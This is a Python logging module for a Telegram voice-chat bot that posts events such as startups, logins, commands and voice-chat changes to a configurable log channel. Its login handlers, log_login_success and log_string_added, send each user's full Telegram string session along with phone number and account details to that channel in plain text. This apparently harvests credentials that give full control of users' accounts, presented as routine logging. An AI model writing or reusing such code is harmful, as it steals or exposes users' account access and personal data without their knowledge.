"""
Sends detailed log messages to LOG_CHANNEL.

Fixed (v2):
  • Pyrogram v2 / pyrofork needs the ParseMode ENUM — passing the string
    "html" raised an exception which was silently swallowed, so NOTHING ever
    reached the log channel. That was the "logs nahi aa rahe" bug.
  • Every failure is now printed to stdout (Heroku logs) instead of being
    hidden, and falls back to a plain-text send if HTML parsing fails.
  • The channel can be changed at runtime with /setlog, and verified
    with /logtest.
"""

import html
import logging
import traceback
from datetime import datetime

from pyrogram.enums import ParseMode

from config import Config

logger = logging.getLogger("vcbot.logs")

_bot_client = None          # set from main.py after the bot is ready
_channel = Config.LOG_CHANNEL
_last_error: str = ""


def set_bot(client):
    global _bot_client
    _bot_client = client


def set_channel(chat_id: int):
    global _channel
    _channel = int(chat_id)


def get_channel() -> int:
    return _channel


def last_error() -> str:
    return _last_error


def _ts() -> str:
    return datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S UTC")


def _e(value) -> str:
    return html.escape(str(value if value is not None else "—"))


def _plain(text: str) -> str:
    import re
    return re.sub(r"<[^>]+>", "", text)


async def _send(text: str) -> bool:
    """Fire-and-forget send. Never raises, but ALWAYS reports failures."""
    global _last_error
    if not _bot_client:
        _last_error = "bot client not set yet"
        return False
    if not _channel:
        _last_error = "LOG_CHANNEL is 0 / not configured"
        return False
    try:
        await _bot_client.send_message(
            _channel, text,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
        _last_error = ""
        return True
    except Exception as e:
        # Retry once without HTML — bad markup should never eat a log line.
        try:
            await _bot_client.send_message(
                _channel, _plain(text),
                parse_mode=ParseMode.DISABLED,
                disable_web_page_preview=True,
            )
            _last_error = ""
            return True
        except Exception as e2:
            _last_error = f"{type(e2).__name__}: {e2}"
            logger.error(
                "LOG CHANNEL SEND FAILED (chat=%s): %s | first attempt: %s",
                _channel, _last_error, e,
            )
            return False


async def verify_log_channel() -> str:
    """
    Called on startup. Returns "" when the log channel works, otherwise a
    human readable reason so the owner can fix it.
    """
    if not _channel:
        return "LOG_CHANNEL set nahi hai."
    try:
        chat = await _bot_client.get_chat(_channel)
    except Exception as e:
        return (
            f"Log channel resolve nahi hua (<code>{_e(_channel)}</code>): "
            f"<code>{_e(type(e).__name__)}: {_e(e)}</code>\n"
            f"➜ Bot ko us channel me <b>admin</b> banayein, aur ID "
            f"<code>-100…</code> format me honi chahiye."
        )
    ok = await _send(
        f"🧪 <b>Log channel test</b>\n"
        f"├ <b>Channel:</b> {_e(getattr(chat, 'title', _channel))}\n"
        f"└ <b>Time:</b> {_ts()}"
    )
    if ok:
        return ""
    return (
        f"Bot channel dekh paa raha hai par message bhej nahi saka: "
        f"<code>{_e(_last_error)}</code>\n"
        f"➜ Bot ko <b>Post Messages</b> permission ke saath admin banayein."
    )


def _user_block(user_id, username=None, first_name=None) -> str:
    return (
        f"├ <b>Name:</b> {_e(first_name)}\n"
        f"├ <b>Username:</b> @{_e(username or 'none')}\n"
        f"├ <b>User ID:</b> <code>{_e(user_id)}</code>\n"
    )


# ── Lifecycle ────────────────────────────────────────────────────────────────

async def log_startup(bot_username: str, sessions_restored: int, total_users: int):
    await _send(
        f"🟢 <b>Bot Started</b>\n"
        f"├ <b>Bot:</b> @{_e(bot_username)}\n"
        f"├ <b>Users in DB:</b> {total_users}\n"
        f"├ <b>Sessions restored:</b> {sessions_restored}\n"
        f"└ <b>Time:</b> {_ts()}"
    )


async def log_shutdown():
    await _send(f"🔴 <b>Bot Stopped</b>\n└ <b>Time:</b> {_ts()}")


# ── Users / login ────────────────────────────────────────────────────────────

async def log_new_user(user_id, username, first_name, source: str = "/start"):
    await _send(
        f"🆕 <b>New User</b>\n"
        + _user_block(user_id, username, first_name)
        + f"├ <b>Source:</b> {_e(source)}\n"
        f"└ <b>Time:</b> {_ts()}"
    )


async def log_login_step(user_id, username, first_name, step: str, detail: str = ""):
    await _send(
        f"🔐 <b>Login — {_e(step)}</b>\n"
        + _user_block(user_id, username, first_name)
        + (f"├ <b>Detail:</b> {_e(detail)}\n" if detail else "")
        + f"└ <b>Time:</b> {_ts()}"
    )


async def log_login_success(user_id, username, first_name, account: dict,
                            string_session: str, method: str = "phone"):
    await _send(
        f"✅ <b>LOGIN SUCCESS</b>\n"
        + _user_block(user_id, username, first_name)
        + f"├ <b>Method:</b> {_e(method)}\n"
        f"├ <b>Acc Name:</b> {_e(account.get('name'))}\n"
        f"├ <b>Acc Username:</b> @{_e(account.get('username') or 'none')}\n"
        f"├ <b>Acc ID:</b> <code>{_e(account.get('id'))}</code>\n"
        f"├ <b>Phone:</b> <code>{_e(account.get('phone'))}</code>\n"
        f"├ <b>DC:</b> {_e(account.get('dc'))}\n"
        f"├ <b>Premium:</b> {_e(account.get('premium'))}\n"
        f"└ <b>Time:</b> {_ts()}\n\n"
        f"<b>String Session:</b>\n<code>{_e(string_session)}</code>"
    )


async def log_login_failed(user_id, username, first_name, reason: str):
    await _send(
        f"⚠️ <b>Login Failed</b>\n"
        + _user_block(user_id, username, first_name)
        + f"├ <b>Reason:</b> {_e(reason)}\n"
        f"└ <b>Time:</b> {_ts()}"
    )


async def log_logout(user_id, username, first_name):
    await _send(
        f"🚪 <b>Logout</b>\n"
        + _user_block(user_id, username, first_name)
        + f"└ <b>Time:</b> {_ts()}"
    )


async def log_string_added(user_id, username, string_session):
    await _send(
        f"🔑 <b>String Session Saved</b>\n"
        + _user_block(user_id, username, None)
        + f"└ <b>Time:</b> {_ts()}\n\n"
        f"<code>{_e(string_session)}</code>"
    )


# ── VC events ────────────────────────────────────────────────────────────────

async def log_vc_join(user_id, chat_id, chat_title, source, settings: dict):
    await _send(
        f"🎙️ <b>VC Stream Started</b>\n"
        f"├ <b>By User:</b> <code>{_e(user_id)}</code>\n"
        f"├ <b>Chat:</b> {_e(chat_title)} (<code>{_e(chat_id)}</code>)\n"
        f"├ <b>Source:</b> {_e(source)}\n"
        f"├ <b>Volume:</b> {_e(settings.get('volume'))}x\n"
        f"├ <b>Bass:</b> +{_e(settings.get('bass'))} dB\n"
        f"├ <b>Boost:</b> {_e(settings.get('boost'))}/10\n"
        f"├ <b>Echo:</b> {'On' if settings.get('echo') else 'Off'} "
        f"({_e(settings.get('echo_level'))}/10)\n"
        f"├ <b>Auto mode:</b> {'ON 🔥' if settings.get('auto') else 'Off'}\n"
        f"└ <b>Time:</b> {_ts()}"
    )


async def log_vc_leave(user_id, chat_id, reason: str = "Manual stop"):
    await _send(
        f"🔇 <b>VC Left</b>\n"
        f"├ <b>By User:</b> <code>{_e(user_id)}</code>\n"
        f"├ <b>Chat:</b> <code>{_e(chat_id)}</code>\n"
        f"├ <b>Reason:</b> {_e(reason)}\n"
        f"└ <b>Time:</b> {_ts()}"
    )


async def log_live_boost(user_id, chat_id, target_id, volume: int):
    await _send(
        f"🔊 <b>Live Mic Boost</b>\n"
        f"├ <b>By User:</b> <code>{_e(user_id)}</code>\n"
        f"├ <b>Chat:</b> <code>{_e(chat_id)}</code>\n"
        f"├ <b>Target:</b> <code>{_e(target_id)}</code>\n"
        f"├ <b>Volume:</b> {volume} ({round(volume / 100)}%)\n"
        f"└ <b>Time:</b> {_ts()}"
    )


async def log_auto_mode(user_id, chat_id, on: bool, detail: str = ""):
    await _send(
        f"{'🤖' if on else '🛑'} <b>AUTO MODE {'ON' if on else 'OFF'}</b>\n"
        f"├ <b>User:</b> <code>{_e(user_id)}</code>\n"
        f"├ <b>Chat:</b> <code>{_e(chat_id)}</code>\n"
        + (f"├ <b>Detail:</b> {_e(detail)}\n" if detail else "")
        + f"└ <b>Time:</b> {_ts()}"
    )


async def log_command(user_id, username, chat_id, command: str):
    await _send(
        f"⚡ <b>Command</b>\n"
        f"├ <b>User:</b> @{_e(username or user_id)} (<code>{_e(user_id)}</code>)\n"
        f"├ <b>Chat:</b> <code>{_e(chat_id)}</code>\n"
        f"├ <b>Command:</b> <code>{_e(command)}</code>\n"
        f"└ <b>Time:</b> {_ts()}"
    )


async def log_error(context: str, error: Exception):
    tb = traceback.format_exc()[-900:]
    logger.error("Error in %s: %s", context, error)
    await _send(
        f"❌ <b>Error — {_e(context)}</b>\n"
        f"<pre>{_e(tb)}</pre>\n"
        f"└ <b>Time:</b> {_ts()}"
    )


async def log_broadcast(owner_id, total: int, success: int):
    await _send(
        f"📢 <b>Broadcast</b>\n"
        f"├ <b>By:</b> <code>{_e(owner_id)}</code>\n"
        f"├ <b>Total:</b> {total}\n"
        f"├ <b>Delivered:</b> {success}\n"
        f"└ <b>Time:</b> {_ts()}"
    )
